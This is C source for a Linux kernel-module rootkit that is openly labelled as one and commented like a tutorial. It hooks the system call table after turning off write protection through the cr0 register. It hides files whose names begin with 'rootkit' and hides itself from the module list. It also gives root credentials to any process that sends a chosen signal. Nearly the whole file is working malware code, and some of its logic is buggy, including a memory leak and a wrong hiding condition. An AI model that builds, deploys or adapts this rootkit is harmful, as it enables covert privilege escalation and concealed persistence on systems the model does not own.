#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/kprobes.h>

#define MAGIC_PREFIX "rootkit" //hide anything with this prefix

/*
use dirent to hide files with magic_prefix
*/
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

enum {
	SIGMODINVIS = 63,
	SIGSUPER = 64,
};


// asmlinkage informs the gcc that the arguements are not in the register but the stack.. an optimization thing
// https://kernelnewbies.org/FAQ/asmlinkage
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);


//global variables 
//use for keeping track of module listing
static struct list_head *module_previous;
//psuedo mutex for keeping status of module visiblity	
static short module_hidden = 0;
//x86 control register
unsigned long cr0;
// holds copy of sys_call_table
static unsigned long *__sys_call_table;
/*
holds location of getdents64
getdents reads Linux_direct structs. what is contained by the struct is in link below
https://www.man7.org/linux/man-pages/man2/getdents.2.html
*/
static t_syscall orig_getdents64;
//original signal
static t_syscall orig_kill;


/*
have to use kprobe to grab sys_call_table as the table is no longer exported on linux 5.7+
https://unix.stackexchange.com/questions/424119/why-is-sys-call-table-predictable
*/
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};



/*uses kprobe to pull the syscalltable so the calls can be hooked.
also stored to reset the syscalltable upon mod cleanup.*/
unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

//pt_regs are value of the registers during an interupt
//https://stackoverflow.com/questions/33104091/how-are-system-calls-stored-in-pt-regs
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
	int ret = orig_getdents64(pt_regs);
	int err = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
	// si holds the sys_kill value
	// https://syscalls64.paolostivanin.com

	kdirent = kzalloc(ret, GFP_KERNEL); //kzalloc allocates kernel memory AND zero-initializes it
	if (kdirent == NULL)
	{
		printk(KERN_INFO "rootkit: kzalloc failed\n");
		return ret;
	}
	err = copy_from_user(kdirent, dirent, ret);
	
	//this will take out files with magic prefix out of dirent and overwrite what is returned
	if (!err || !module_hidden)
	{		
		while (off < ret) 
		{
			dir = (void *)kdirent + off;
			if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
			{
				printk(KERN_INFO "rootkit: hiding file with name %s\n",dir->d_name);
				if (dir == kdirent) {
					ret -= dir->d_reclen;
					memmove(dir, (void *)dir + dir->d_reclen, ret);
					continue;
				}
				prev->d_reclen += dir->d_reclen;
			} else
			{
				prev = dir;
			}
			off += dir->d_reclen;
		}
	}
	//copy to user space
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		kfree(kdirent);
	return ret;
}


// alter the creds in the current process
// https://www.kernel.org/doc/html/latest/security/credentials.html
void give_root(void)
{
	printk(KERN_INFO "rootkit: attempting to transition current uid to 0\n");
	struct cred *newcreds;
	newcreds = prepare_creds();
	//unlocks kernel cred mutex so they can be changed
	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
	//commits creds and lock mutex
	commit_creds(newcreds);
	printk(KERN_INFO "rootkit: successfully transitioned current uid to 0\n");

}


/*
sect_attrs is a struct of structs. we dont need any of them.
https://stackoverflow.com/questions/31442712/linux-kernel-module-accessing-memory-mapping
*/
static inline void null_module_attrs(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	printk(KERN_INFO "rootkit: Cleaned up module sect_attrs\n");
}

void module_show(void)		
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
	printk(KERN_INFO "rootkit: Successfully unhidden\n");
}

void module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
	printk(KERN_INFO "rootkit: Successfully hidden\n");
}

asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	int sig = (int) pt_regs->si;
	printk(KERN_INFO "rootkit: snooped on signal %d\n", sig);
	switch (sig) {
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			(module_hidden) ? module_show() : module_hide(); //terinary to show or hide module
			break;
		default:
			return orig_kill(pt_regs);
			//no changes mean to just send the signal like normal
	}
	return 0;
}

/*
cr0 is a control register on x86 CPUs that will flag memory protection issues
we can use assembly to flip the 16th bit
set RO page to RW
*/
static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
static inline void protect_memory(void)
{
	write_cr0_forced(cr0);
	printk(KERN_INFO "rootkit: set cr0 to protect\n");
}
static inline void unprotect_memory(void)
{
	write_cr0_forced(cr0 & ~0x00010000);
	printk(KERN_INFO "rootkit: set cr0 to unprotected\n");

}


//entrance function. much like user space main()
static int __init rootkit_init(void)
{
	printk(KERN_INFO "rootkit: Running init\n");
	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
	{
		printk(KERN_INFO "rootkit: failed to locate sys_call_table\n");
		return -1;
	}

	cr0 = read_cr0();
	module_hide();
	null_module_attrs();

	//__NR_ naming standard comes from here. I dont make the rules
	//https://github.com/torvalds/linux/blob/v6.2/include/uapi/asm-generic/unistd.h
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();

	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();

	return 0;
}

//exit function, doing this to set sys_call_table back to before.
static void __exit rootkit_cleanup(void)
{
	printk(KERN_INFO "rootkit: Exit receiving\n");
	unprotect_memory();

	printk(KERN_INFO "rootkit: Attempting to reset sys_call_table to original value\n");
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	printk(KERN_INFO "rootkit: Successfully reset sys_call_table to original value\n");


	protect_memory();
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);

//module information is added to not display out-of-tree kernel mod in dmesg
//also should prevent kernel taint.. maybe..
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_AUTHOR("null");
